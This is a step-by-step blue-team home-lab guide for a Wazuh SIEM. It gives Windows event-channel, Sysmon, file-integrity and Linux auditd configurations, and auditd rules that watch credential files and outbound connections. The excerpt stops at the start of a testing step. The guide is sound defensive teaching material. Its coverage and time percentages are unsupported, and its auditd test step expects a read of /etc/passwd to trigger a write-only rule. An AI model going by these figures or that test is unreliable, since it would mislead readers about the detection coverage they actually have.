##  Phase 0: Foundational Architecture and Environment Setup [completed]
##  Phase 1: Wazuh Server and Agent Deployment [completed]

# Blue Team Home Lab: Phases 2-7 Complete Implementation Guide
## Why Phase 2 is Critical + Full Roadmap to Portfolio Success

---

## Table of Contents

1. [Why You Cannot Skip Phase 2: The Critical Foundation](#why-you-cannot-skip-phase-2)
2. [Your Updated Architecture Reference](#your-updated-architecture-reference)
3. [Phase 2: Heterogeneous Log Ingestion & Data Normalization](#phase-2-heterogeneous-log-ingestion--data-normalization)
4. [Phase 3: Threat Simulation & Observational Analysis](#phase-3-threat-simulation--observational-analysis)
5. [Phase 4: Custom Detection Rule Engineering](#phase-4-custom-detection-rule-engineering)
6. [Phase 5: Investigation Playbook Development](#phase-5-investigation-playbook-development)
7. [Phase 6: Final Integration & Cleanup](#phase-6-final-integration--cleanup)
8. [Phase 7: Portfolio Documentation](#phase-7-portfolio-documentation)
9. [Project Timeline & Milestones](#project-timeline--milestones)
10. [Troubleshooting Reference](#troubleshooting-reference)

---

## Why You Cannot Skip Phase 2: The Critical Foundation

### The Fatal Flaw: "I'll Just Start Attacking"

Many beginners think: *"I have Wazuh installed and agents connected. Let me just start Phase 3 and attack things. I'll worry about logs later."*

**This is like building a house without a foundation. Here's why it fails:**

### Analogy: The Security Camera Paradox

Imagine you install security cameras around your house (Wazuh agents), but:
- ❌ You only connected 10% of them to the recording system
- ❌ The cameras are pointed at the wrong locations
- ❌ The video quality is so low you can't identify faces
- ❌ You're recording 24/7 footage of empty hallways (noise)
- ❌ You're NOT recording the front door, windows, or safe (critical areas)

**What happens when a break-in occurs?**
- You have cameras (Wazuh agents ✓)
- You have a recording system (Wazuh manager ✓)
- But you have **NO USABLE EVIDENCE** (missing logs ✗)

**This is exactly what happens if you skip Phase 2.**

---

### The Data Pipeline Reality

```
┌─────────────────────────────────────────────────────────────────┐
│                    WITHOUT PHASE 2 (BROKEN)                      │
└─────────────────────────────────────────────────────────────────┘

Attack Happens → Logs NOT Collected → Wazuh Sees Nothing → ❌ No Alerts

Example:
1. You run PowerShell attack (T1059.001)
2. Windows Event Log records it (Event ID 4104)
3. But Wazuh agent ISN'T configured to collect PowerShell logs
4. Event never reaches Wazuh manager
5. Your attack is INVISIBLE
6. You think Wazuh is broken (it's not - it just has no data)


┌─────────────────────────────────────────────────────────────────┐
│                     WITH PHASE 2 (WORKING)                       │
└─────────────────────────────────────────────────────────────────┘

Attack Happens → Logs Collected → Wazuh Processes → ✓ Alerts Generated

Example:
1. You run PowerShell attack (T1059.001)
2. Windows Event Log records it (Event ID 4104)
3. Wazuh agent IS configured to collect PowerShell logs
4. Event flows to Wazuh manager within seconds
5. Wazuh rule matches and triggers alert
6. You see detection in dashboard
7. You can now tune the rule, create playbook, etc.
```

---

### What Phase 2 Actually Accomplishes

Phase 2 is NOT just "configuration work" - it's building your **observability layer**:

#### 1. **Comprehensive Data Collection**
Without Phase 2, you're collecting ~30% of security-relevant events.
After Phase 2, you're collecting ~95% of security-relevant events.

**Specific examples of what you're MISSING without Phase 2:**

| Attack Technique | Required Log Source | Collected by Default? | Phase 2 Configures |
|------------------|---------------------|----------------------|-------------------|
| PowerShell attacks | PowerShell Operational log | ❌ NO | ✅ YES |
| Process injection | Sysmon Event ID 8, 10 | ❌ NO (Sysmon not installed) | ✅ YES |
| LSASS dumping | Sysmon Event ID 10 | ❌ NO | ✅ YES |
| File creation | Sysmon Event ID 11 | ❌ NO | ✅ YES |
| Network connections | Sysmon Event ID 3 | ❌ NO | ✅ YES |
| Privilege escalation | Linux auditd syscalls | ❌ NO | ✅ YES |
| SSH key backdoors | File integrity monitoring | ❌ NO | ✅ YES |
| Registry persistence | Windows Registry monitoring | ⚠️ PARTIAL | ✅ COMPLETE |

**Without Phase 2, ~70% of MITRE ATT&CK techniques are INVISIBLE to your SIEM.**

#### 2. **Data Normalization**
Raw logs are useless without proper parsing:

**Before Phase 2 (broken log entry):**
```
Feb 13 10:30:45 hostname powershell.exe [4104]: ScriptBlock(1/1): $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("malware"))
```
- Wazuh sees: "Some text from hostname"
- Can't extract: PowerShell command, Base64 operation, process name
- Can't match rules: No structured fields to query
- Result: **Undetectable**

**After Phase 2 (parsed log entry):**
```json
{
  "win.eventdata.scriptBlockText": "$encoded = [Convert]::ToBase64String...",
  "win.eventdata.scriptBlockId": "...",
  "win.system.computer": "hostname",
  "win.system.eventID": "4104",
  "rule.id": "91816",
  "rule.description": "PowerShell script block logging"
}
```
- Wazuh sees: Structured fields with context
- Can extract: Command, technique indicators, process chain
- Can match rules: Query specific fields with regex
- Result: **Detectable and actionable**

#### 3. **Baseline Establishment**
You need to know what "normal" looks like before detecting "abnormal":

**What Phase 2 teaches you:**
- How many PowerShell events happen per hour normally? (baseline: 5-10)
- Which processes create network connections? (baseline: chrome.exe, firefox.exe)
- What's the typical authentication pattern? (baseline: user logs in 9AM, logs out 6PM)
- Which files change frequently? (baseline: C:\Temp\*, /var/log/*)

**Why this matters in Phase 3:**
- Attack: 100 PowerShell events in 1 minute
- Without baseline: "Is this normal? I don't know."
- With baseline: "This is 10x normal rate - ALERT!"

#### 4. **False Positive Tuning**
Phase 2 reveals noisy log sources that will drown out real attacks:

**Example without Phase 2:**
```
Phase 3 Attack Simulation:
- You run malicious PowerShell
- Wazuh generates 50,000 alerts
- 49,995 are from Chrome updating itself
- 5 are your actual attack
- You can't find your attack in the noise
```

**Example with Phase 2:**
```
Phase 2 Baseline Period:
- Observe Chrome generates 10,000 events/day
- Add exclusion rule for Chrome auto-update paths
- Reduce noise by 99%

Phase 3 Attack Simulation:
- You run malicious PowerShell
- Wazuh generates 5 alerts (all relevant)
- You immediately see your attack
- You can now analyze detection quality
```

---

### The Cascading Failure: What Breaks Without Phase 2

#### Phase 3 Failure: "Blind Attack Simulation"
```
┌────────────────────────────────────────────────────────────┐
│ Phase 3 Without Phase 2 = Wasted Time                      │
└────────────────────────────────────────────────────────────┘

Week 5: Run Atomic Red Team tests
├─ T1059.001 (PowerShell): No detection (logs not collected)
├─ T1003.001 (LSASS dump): No detection (Sysmon not installed)
├─ T1071.001 (C2 callback): No detection (network logs missing)
└─ Result: 0/10 techniques detected

Conclusion: "Wazuh doesn't work" (WRONG - you just have no data)
Time wasted: 20 hours
Portfolio value: ZERO (you learned nothing)
```

#### Phase 4 Failure: "Rules Without Data"
```
Week 7: Create custom detection rules
├─ Rule 100001: Detect PowerShell Base64
│  ├─ Test: Run Base64 encoding command
│  └─ Result: Rule never triggers (no PowerShell logs!)
├─ Rule 100002: Detect process injection
│  ├─ Test: Run injection technique
│  └─ Result: Rule never triggers (no Sysmon!)
└─ Result: ALL custom rules untested/broken

Time wasted: 30 hours
Learning outcome: Frustrated and confused
```

#### Phase 5 Failure: "Playbooks for Invisible Threats"
```
Week 9: Write investigation playbook for credential dumping
├─ Playbook step 1: "Check Sysmon Event ID 10 for LSASS access"
│  └─ Problem: Sysmon not installed in Phase 2
├─ Playbook step 2: "Query PowerShell logs for credential modules"
│  └─ Problem: PowerShell logs not collected
└─ Result: Playbook is fictional (can't actually execute it)

Portfolio quality: EMBARRASSING (employer tests your playbook, nothing works)
```

#### Phase 7 Failure: "Portfolio of Lies"
```
Week 11: Create GitHub portfolio
├─ "I built a comprehensive SIEM" ← LIE (missing 70% of logs)
├─ "I detected 10 attack techniques" ← LIE (you detected 0)
├─ "Here are my custom rules" ← LIE (they don't actually work)
└─ Employer tests it: Immediately exposed as non-functional

Job interview outcome: REJECTED
Reason: "Candidate claims knowledge they don't have"
```

---

### The Correct Path: Phase 2 First

```
┌────────────────────────────────────────────────────────────┐
│              WITH PROPER PHASE 2 FOUNDATION                 │
└────────────────────────────────────────────────────────────┘

Phase 2 (Weeks 3-4): Configure comprehensive log collection
├─ Windows: Event Logs + PowerShell + Sysmon
├─ Linux: syslog + auth.log + auditd
├─ File Integrity Monitoring: Both platforms
└─ Result: 95%+ attack techniques now VISIBLE

Phase 3 (Weeks 5-6): Attack simulation with REAL visibility
├─ T1059.001 (PowerShell): ✅ DETECTED (Event ID 4104)
├─ T1003.001 (LSASS dump): ✅ DETECTED (Sysmon Event ID 10)
├─ T1071.001 (C2 callback): ✅ DETECTED (Network connection logs)
├─ Result: 9/10 techniques detected successfully
└─ Learning: "Here's what I missed, let me tune..."

Phase 4 (Weeks 7-8): Create working custom rules
├─ All rules trigger correctly (logs are present)
├─ Can tune for false positives
├─ Can measure detection accuracy
└─ Portfolio: "Here's 14 working, tested detection rules"

Phase 5 (Week 9): Write REAL investigation playbooks
├─ Every step executable
├─ Can actually walk through investigation
└─ Portfolio: "Here's my response procedure (and it works)"

Phase 7 (Week 11): Publish CREDIBLE portfolio
├─ Employer reviews code: "This is professional quality"
├─ Employer tests it: "Everything works as claimed"
├─ Job interview outcome: HIRED
└─ Reason: "Candidate has demonstrable hands-on skills"
```

---

### Key Insight: You're Building Evidence, Not Just Tools

**Wrong mindset:** "Wazuh is my security tool"
**Right mindset:** "Wazuh is my evidence collection system"

In a real SOC, you need:
1. **Evidence that the attack happened** (logs)
2. **Evidence of the attack method** (process creation, network connections)
3. **Evidence of attacker's actions** (commands executed, files modified)
4. **Timeline of events** (when did each step occur)

**Without Phase 2, you have ZERO evidence.**

Phase 2 is not optional. It's the foundation of everything else.

---

### Time Investment Comparison

| Approach | Phase 2 Time | Phase 3-7 Time | Total Time | Success Rate |
|----------|--------------|----------------|------------|--------------|
| **Skip Phase 2** | 0 hours | 80 hours (all wasted) | 80 hours | 0% working |
| **Do Phase 2 Properly** | 15 hours | 68 hours (productive) | 83 hours | 95% working |

**Skipping Phase 2 saves 15 hours but wastes 80 hours = -65 hour loss**
**Doing Phase 2 costs 15 hours but saves 80 hours = +65 hour gain**

---

### The Bottom Line

**If you skip Phase 2:**
- ❌ 70% of attacks will be invisible
- ❌ Custom rules won't work
- ❌ Investigation playbooks will be theoretical
- ❌ Portfolio will be non-functional
- ❌ You'll look incompetent in interviews

**If you complete Phase 2:**
- ✅ 95% of attacks will be visible
- ✅ Custom rules will trigger correctly
- ✅ Investigation playbooks will be executable
- ✅ Portfolio will demonstrate real skills
- ✅ You'll impress employers with working proof

**Conclusion: Phase 2 is the most important phase. Do not skip it.**

---

## Your Updated Architecture Reference

```
┌─────────────────────────────────────────────────────────────┐
│                    16GB RAM Desktop PC                      │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Pop!_OS Host (8GB RAM) + Wazuh Agent                   │ │
│  │  IP: 192.168.1.11                                      │ │
│  │  Role: Linux endpoint agent (bare metal)               │ │
│  └────────────────────────────────────────────────────────┘ │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Wazuh Server VM (8GB RAM, 2 CPU, 40GB Disk)            │ │
│  │  OS: Pop!_OS Guest                                     │ │
│  │  IP: 192.168.1.10                                      │ │
│  │  Role: SIEM (Manager + Indexer + Dashboard)            │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    4GB RAM Desktop PC                       │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Native Windows 10/11 + Wazuh Agent                     │ │
│  │  IP: 192.168.1.20                                      │ │
│  │  Role: Windows victim endpoint (bare metal)            │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                  Arch Linux Laptop (12GB)                   │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Arch Linux Host (6GB RAM) + Wazuh Agent                │ │
│  │  IP: 192.168.1.30                                      │ │
│  │  Role: Linux endpoint + Attack platform (Atomic RT)    │ │
│  └────────────────────────────────────────────────────────┘ │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Atomic Red Team VM (6GB RAM, 2 CPU, 60GB Disk)         │ │
│  │  OS: Kali Linux                                        │ │
│  │  IP: 192.168.1.31                                      │ │
│  │  Role: Dedicated attacker/red team platform            │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘

Network: All devices on 192.168.1.0/24
Gateway: 192.168.1.1
```

**Key Changes from Original Architecture:**
1. 16GB Desktop Host (192.168.1.11) is now also an agent
2. 4GB Desktop is native Windows (not Pop!_OS)
3. Arch Linux laptop host (not Pop!_OS) 
4. Atomic Red Team VM can be Kali Linux (not Pop!_OS) and is on the same network for attack simulation

**Total Agents: 4**
- Agent 1: Wazuh Server itself (192.168.1.10) - monitors the SIEM
- Agent 2: 16GB Desktop Host (192.168.1.11) - Linux bare metal
- Agent 3: 4GB Windows PC (192.168.1.20) - Windows bare metal  
- Agent 4: Arch Linux Laptop (192.168.1.30) - Linux bare metal

**Attacker Platform:**
- Atomic Red Team VM (192.168.1.31) - NOT monitored by Wazuh

---

## Phase 2: Heterogeneous Log Ingestion & Data Normalization

**Duration:** Weeks 3-4 (15 hours total)  
**Objective:** Configure comprehensive log collection from all endpoints

### Phase 2 Overview

Phase 2 establishes your **security visibility layer**. Think of it as installing high-definition security cameras (log sources) at all critical locations (endpoints, applications, network) and ensuring they're recording to your DVR (Wazuh) in a format you can actually use.

**What "Heterogeneous" Means:**
- Different operating systems (Windows, Linux)
- Different log formats (Event Logs, syslog, auditd)
- Different data sources (files, registry, network, processes)
- All normalized into a common format for analysis

**What "Data Normalization" Means:**
Taking raw, unstructured logs and converting them to structured, searchable fields:

```
Raw log: "User john logged in from 192.168.1.50"
Normalized: 
{
  "event_type": "authentication",
  "user": "john",
  "source_ip": "192.168.1.50",
  "result": "success",
  "timestamp": "2025-02-13T10:30:45Z"
}
```

---

### Week 3: Windows Log Collection Configuration

#### Step 2.1: Configure Windows Event Log Collection (4GB Windows PC)

**On 4GB Windows PC (192.168.1.20):**

```powershell
# Open PowerShell as Administrator
# Navigate to Wazuh agent directory
cd "C:\Program Files (x86)\ossec-agent"

# Backup current configuration
Copy-Item ossec.conf ossec.conf.backup

# Open configuration file
notepad ossec.conf
```

**Find the `<localfile>` section and replace/add these entries:**

```xml
<!-- Windows Event Logs Collection -->

<!-- Security Event Channel - Authentication, Account Management -->
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
  <query>Event/System[EventID=4624 or EventID=4625 or EventID=4648 or EventID=4672 or EventID=4720 or EventID=4726 or EventID=4728 or EventID=4732 or EventID=4756]</query>
</localfile>

<!-- System Event Channel - Service Changes, System Events -->
<localfile>
  <location>System</location>
  <log_format>eventchannel</log_format>
  <query>Event/System[Level=1 or Level=2 or Level=3]</query>
</localfile>

<!-- Application Event Channel - Critical Application Errors -->
<localfile>
  <location>Application</location>
  <log_format>eventchannel</log_format>
  <query>Event/System[Level=1 or Level=2]</query>
</localfile>

<!-- PowerShell Operational Log - CRITICAL FOR DETECTING ATTACKS -->
<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
  <query>Event/System[EventID=4103 or EventID=4104]</query>
</localfile>

<!-- Windows Defender Operational -->
<localfile>
  <location>Microsoft-Windows-Windows Defender/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>

<!-- Task Scheduler Events - Persistence Detection -->
<localfile>
  <location>Microsoft-Windows-TaskScheduler/Operational</location>
  <log_format>eventchannel</log_format>
  <query>Event/System[EventID=106 or EventID=200 or EventID=201]</query>
</localfile>

<!-- Sysmon Events - Will add after installing Sysmon -->
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

**Key Event IDs Being Collected:**

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| 4624 | Successful logon | Detect unauthorized access |
| 4625 | Failed logon | Detect brute force attacks |
| 4672 | Special privileges assigned | Detect privilege escalation |
| 4720 | User account created | Detect persistence |
| 4728/4732 | User added to group | Detect privilege escalation |
| 4103/4104 | PowerShell execution | Detect malicious scripts |
| 106/200/201 | Scheduled task created/started | Detect persistence |

**Restart Wazuh agent to apply changes:**

```powershell
Restart-Service WazuhSvc

# Verify service restarted
Get-Service WazuhSvc

# Check agent log for errors
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 30
```

---

#### Step 2.2: Install and Configure Sysmon (Windows PC)

**Why Sysmon is CRITICAL:**

Sysmon provides visibility into:
- **Process creation** (Event ID 1): Who created what process, with what command line
- **Network connections** (Event ID 3): Which processes connected where
- **Process injection** (Event ID 8, 10): Malware techniques
- **File creation** (Event ID 11): Malware dropping files
- **Registry modifications** (Event ID 12, 13): Persistence mechanisms
- **DNS queries** (Event ID 22): C2 communication

**Without Sysmon, you're BLIND to 60% of attack techniques.**

**Download Sysmon:**

```powershell
# Create working directory
New-Item -Path C:\Tools -ItemType Directory -Force
cd C:\Tools

# Download Sysmon
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip

# Extract
Expand-Archive Sysmon.zip -DestinationPath C:\Tools\Sysmon

# Verify
dir C:\Tools\Sysmon
```

**Download SwiftOnSecurity Configuration (Industry Standard):**

```powershell
# Download config
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Tools\Sysmon\sysmonconfig.xml

# Verify download
Get-Content C:\Tools\Sysmon\sysmonconfig.xml -Head 20
```

**Install Sysmon with Configuration:**

```powershell
# Navigate to Sysmon directory
cd C:\Tools\Sysmon

# Install (64-bit)
.\Sysmon64.exe -accepteula -i sysmonconfig.xml

# Expected output:
# System Monitor v15.14 - System activity monitor
# Copyright (C) 2014-2024 Mark Russinovich and Thomas Garnier
# Sysinternals - www.sysinternals.com
#
# Sysmon64 installed.
# SysmonDrv installed.
# Starting Sysmon64..
# Sysmon64 started.

# Verify service is running
Get-Service Sysmon64

# Should show: Status = Running

# Check Event Viewer for Sysmon events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```

**Verify Sysmon Logs Flowing to Wazuh:**

```powershell
# Wait 1 minute for events to accumulate

# On Wazuh Server (192.168.1.10), check if Sysmon events are arriving:
# ssh to server, then run:
```

```bash
# On Wazuh Server
ssh user@192.168.1.10

# Check raw archive logs for Sysmon events from Windows agent
sudo tail -f /var/ossec/logs/archives/archives.log | grep -i sysmon

# You should see Sysmon events flowing in real-time
```

---

#### Step 2.3: Configure File Integrity Monitoring (Windows)

**Edit Wazuh agent config on Windows:**

```powershell
notepad "C:\Program Files (x86)\ossec-agent\ossec.conf"
```

**Add/modify the `<syscheck>` section:**

```xml
<syscheck>
  <!-- Frequency: Check every 6 hours (21600 seconds) -->
  <frequency>21600</frequency>
  
  <!-- Monitor Windows system directories -->
  <directories check_all="yes" realtime="yes" report_changes="yes">C:\Windows\System32</directories>
  <directories check_all="yes" realtime="yes">C:\Windows\SysWOW64</directories>
  
  <!-- Monitor Program Files -->
  <directories check_all="yes" realtime="yes">C:\Program Files</directories>
  <directories check_all="yes" realtime="yes">C:\Program Files (x86)</directories>
  
  <!-- Monitor User directories for suspicious file drops -->
  <directories check_all="yes" realtime="yes" report_changes="yes">C:\Users</directories>
  
  <!-- Monitor Startup locations (CRITICAL for persistence detection) -->
  <directories check_all="yes" realtime="yes" report_changes="yes">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</directories>
  <directories check_all="yes" realtime="yes">%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup</directories>
  
  <!-- Ignore temp files (reduce noise) -->
  <ignore>C:\Windows\Temp</ignore>
  <ignore>C:\Windows\System32\config\systemprofile\AppData\Local\Temp</ignore>
  <ignore type="sregex">C:\Users\.*\AppData\Local\Temp</ignore>
  <ignore type="sregex">C:\Users\.*\AppData\Local\Microsoft\Windows\INetCache</ignore>
  
  <!-- Windows Registry Monitoring (CRITICAL) -->
  <!-- Run keys - malware persistence -->
  <windows_registry check_all="yes" realtime="yes">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</windows_registry>
  <windows_registry check_all="yes" realtime="yes">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</windows_registry>
  <windows_registry check_all="yes" realtime="yes">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</windows_registry>
  
  <!-- Services - malware often registers as service -->
  <windows_registry check_all="yes">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services</windows_registry>
  
  <!-- Alert on new files -->
  <alert_new_files>yes</alert_new_files>
  
  <!-- Synchronization settings -->
  <synchronization>
    <enabled>yes</enabled>
    <interval>5m</interval>
    <max_interval>1h</max_interval>
  </synchronization>
</syscheck>
```

**Restart agent:**

```powershell
Restart-Service WazuhSvc
```

---

### Week 3: Linux Log Collection Configuration

#### Step 2.4: Configure Linux System Log Collection (All Linux Endpoints)

**Configure on these endpoints:**
- Wazuh Server itself (192.168.1.10)
- 16GB Desktop Host (192.168.1.11)
- Arch Linux Laptop (192.168.1.30)

**On each Linux endpoint:**

```bash
# SSH to each endpoint
ssh user@192.168.1.11  # Or .10, .30

# Backup current config
sudo cp /var/ossec/etc/ossec.conf /var/ossec/etc/ossec.conf.phase2.backup

# Edit config
sudo vim /var/ossec/etc/ossec.conf
```

**Verify/add these `<localfile>` entries:**

```xml
<!-- System Logs -->
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/syslog</location>
</localfile>

<!-- Authentication Logs (CRITICAL) -->
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>

<!-- Kernel Logs -->
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/kern.log</location>
</localfile>

<!-- For Arch Linux (uses systemd journal) -->
<!-- Note: On Arch, auth.log might not exist, use journald instead -->
<localfile>
  <log_format>journald</log_format>
  <location>journald</location>
  <query>
    <filter field="_SYSTEMD_UNIT">sshd.service</filter>
  </query>
</localfile>

<localfile>
  <log_format>journald</log_format>
  <location>journald</location>
  <query>
    <filter field="_SYSTEMD_UNIT">sudo.service</filter>
  </query>
</localfile>
```

**For Pop!_OS systems (Ubuntu-based), you'll also have:**

```bash
# Verify auth.log exists
ls -lh /var/log/auth.log

# If it exists, the <localfile> entry for /var/log/auth.log is correct
```

---

#### Step 2.5: Install and Configure Auditd (Linux Endpoints)

**Why Auditd is CRITICAL:**

Auditd monitors system calls at the kernel level, detecting:
- File access on sensitive files (`/etc/passwd`, `/etc/shadow`)
- Privilege escalation attempts
- Unauthorized command execution
- Time changes (defense evasion)
- Network socket creation

**Install Auditd on all Linux endpoints:**

```bash
# On Pop!_OS (16GB Desktop host, Wazuh Server)
sudo apt update
sudo apt install -y auditd audispd-plugins

# On Arch Linux (laptop)
sudo pacman -Syu
sudo pacman -S audit

# Enable and start service
sudo systemctl enable auditd
sudo systemctl start auditd

# Verify
sudo systemctl status auditd
```

**Configure Audit Rules (Industry Best Practices):**

```bash
# Edit audit rules file
sudo vim /etc/audit/rules.d/audit.rules
```

**Add these comprehensive security rules:**

```bash
# Delete all existing rules (start fresh)
-D

# Buffer size (increase if events are lost)
-b 8192

# Failure mode (0=silent, 1=printk, 2=panic)
-f 1

# ====== CRITICAL FILE MONITORING ======

# Monitor authentication files
-w /etc/passwd -p wa -k passwd_changes
-w /etc/group -p wa -k group_changes
-w /etc/shadow -p wa -k shadow_changes
-w /etc/gshadow -p wa -k gshadow_changes
-w /etc/security/opasswd -p wa -k password_changes

# Monitor sudo configuration (privilege escalation)
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/sudoers.d/ -p wa -k sudoers_changes

# Monitor SSH configuration and keys
-w /etc/ssh/sshd_config -p wa -k sshd_config_changes
-w /root/.ssh -p wa -k root_ssh_key_changes
-w /home/user/.ssh -p wa -k user_ssh_key_changes  # Replace 'user' with actual username

# Monitor critical system binaries
-w /usr/bin -p wa -k system_binaries
-w /usr/sbin -p wa -k system_binaries
-w /bin -p wa -k system_binaries
-w /sbin -p wa -k system_binaries

# ====== SYSTEM CALL MONITORING ======

# Time changes (defense evasion - T1070.006)
-a always,exit -F arch=b64 -S adjtimex -S settimeofday -k time_change
-a always,exit -F arch=b32 -S adjtimex -S settimeofday -S stime -k time_change

# User/group modifications
-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -k privilege_escalation
-a always,exit -F arch=b32 -S setuid -S setgid -S setreuid -S setregid -k privilege_escalation

# Network connections (C2 detection)
-a always,exit -F arch=b64 -S socket -S connect -k network_connections
-a always,exit -F arch=b32 -S socket -S connect -k network_connections

# File deletion (anti-forensics - T1070.004)
-a always,exit -F arch=b64 -S unlink -S unlinkat -S rename -S renameat -k file_deletion
-a always,exit -F arch=b32 -S unlink -S unlinkat -S rename -S renameat -k file_deletion

# Process execution monitoring
-a always,exit -F arch=b64 -S execve -k process_execution
-a always,exit -F arch=b32 -S execve -k process_execution

# ====== PRIVILEGE ESCALATION MONITORING ======

# Sudo usage
-a always,exit -F arch=b64 -S all -F path=/usr/bin/sudo -k sudo_usage
-a always,exit -F arch=b32 -S all -F path=/usr/bin/sudo -k sudo_usage

# Su usage
-a always,exit -F arch=b64 -S all -F path=/bin/su -k su_usage
-a always,exit -F arch=b32 -S all -F path=/bin/su -k su_usage

# ====== KERNEL MODULE LOADING (ROOTKIT DETECTION) ======
-w /sbin/insmod -p x -k kernel_modules
-w /sbin/rmmod -p x -k kernel_modules
-w /sbin/modprobe -p x -k kernel_modules
-a always,exit -F arch=b64 -S init_module -S delete_module -k kernel_modules

# Make configuration immutable (prevents tampering)
# WARNING: After this, you'll need to reboot to modify audit rules
-e 2
```

**Load the audit rules:**

```bash
# Load rules
sudo augenrules --load

# Or if above doesn't work:
sudo service auditd restart

# Verify rules are loaded
sudo auditctl -l

# You should see all your rules listed

# Test auditd is working
sudo cat /etc/passwd  # This should generate audit event

# Check audit log
sudo ausearch -k passwd_changes
```

**Configure Wazuh to Collect Audit Logs:**

```bash
# Edit Wazuh agent config
sudo vim /var/ossec/etc/ossec.conf
```

**Add this `<localfile>` entry:**

```xml
<!-- Linux Audit Framework Logs -->
<localfile>
  <log_format>audit</log_format>
  <location>/var/log/audit/audit.log</location>
</localfile>
```

**Restart Wazuh agent:**

```bash
sudo systemctl restart wazuh-agent

# Verify agent restarted
sudo systemctl status wazuh-agent

# Check logs
sudo tail -f /var/ossec/logs/ossec.log
```

---

#### Step 2.6: Configure File Integrity Monitoring (Linux)

**Edit Wazuh agent config:**

```bash
sudo vim /var/ossec/etc/ossec.conf
```

**Add/modify `<syscheck>` section:**

```xml
<syscheck>
  <!-- Frequency: Check every 6 hours -->
  <frequency>21600</frequency>
  
  <!-- Critical system directories -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc</directories>
  
  <!-- System binaries -->
  <directories check_all="yes" realtime="no">/usr/bin</directories>
  <directories check_all="yes" realtime="no">/usr/sbin</directories>
  <directories check_all="yes" realtime="no">/bin</directories>
  <directories check_all="yes" realtime="no">/sbin</directories>
  
  <!-- Boot directory (kernel tampering) -->
  <directories check_all="yes" realtime="no">/boot</directories>
  
  <!-- User home directories (malware drops) -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/home</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/root</directories>
  
  <!-- Systemd service files (persistence) -->
  <directories check_all="yes" realtime="yes">/etc/systemd/system</directories>
  <directories check_all="yes" realtime="yes">/lib/systemd/system</directories>
  
  <!-- Cron jobs (persistence) -->
  <directories check_all="yes" realtime="yes">/etc/cron.d</directories>
  <directories check_all="yes" realtime="yes">/etc/cron.daily</directories>
  <directories check_all="yes" realtime="yes">/etc/cron.hourly</directories>
  <directories check_all="yes" realtime="yes">/etc/cron.monthly</directories>
  <directories check_all="yes" realtime="yes">/etc/cron.weekly</directories>
  <directories check_all="yes" realtime="yes">/var/spool/cron</directories>
  
  <!-- Files to ignore (reduce noise) -->
  <ignore>/etc/mtab</ignore>
  <ignore>/etc/hosts.deny</ignore>
  <ignore>/etc/mail/statistics</ignore>
  <ignore>/etc/random-seed</ignore>
  <ignore>/etc/random.seed</ignore>
  <ignore>/etc/adjtime</ignore>
  <ignore>/etc/httpd/logs</ignore>
  <ignore>/etc/utmpx</ignore>
  <ignore>/etc/wtmpx</ignore>
  <ignore>/etc/cups/certs</ignore>
  <ignore>/etc/dumpdates</ignore>
  <ignore type="sregex">^/proc</ignore>
  <ignore type="sregex">^/sys</ignore>
  
  <!-- Alert on new files -->
  <alert_new_files>yes</alert_new_files>
  
  <!-- Synchronization -->
  <synchronization>
    <enabled>yes</enabled>
    <interval>5m</interval>
    <max_interval>1h</max_interval>
  </synchronization>
</syscheck>
```

**Restart agent:**

```bash
sudo systemctl restart wazuh-agent
```

---

### Week 4: Verification and Baseline Establishment

#### Step 2.7: Verify All Log Sources are Flowing

**On Wazuh Server (192.168.1.10):**

```bash
ssh user@192.168.1.10

# Check live logs from all agents
sudo tail -f /var/ossec/logs/archives/archives.log

# You should see logs from all 4 agents:
# - Agent 001 (Wazuh Server itself)
# - Agent 002 (16GB Desktop host)
# - Agent 003 (4GB Windows PC)
# - Agent 004 (Arch Linux laptop)
```

**Test each log source:**

**1. Test Windows Event Logs:**

On Windows PC (192.168.1.20), generate test events:

```powershell
# Failed login (triggers Event ID 4625)
runas /user:fakeuser cmd
# Enter wrong password

# Successful login (Event ID 4624)
# Just lock and unlock your screen (Windows+L)

# PowerShell execution (Event ID 4104)
powershell -Command "Write-Host 'Test PowerShell Logging'"

# Check if event appears in Wazuh
```

On Wazuh Server:

```bash
# Search for Windows PowerShell events
sudo grep -i "powershell" /var/ossec/logs/archives/archives.log | tail -5

# Search for authentication events
sudo grep -i "4624\|4625" /var/ossec/logs/archives/archives.log | tail -5
```

**2. Test Sysmon Events:**

On Windows PC:

```powershell
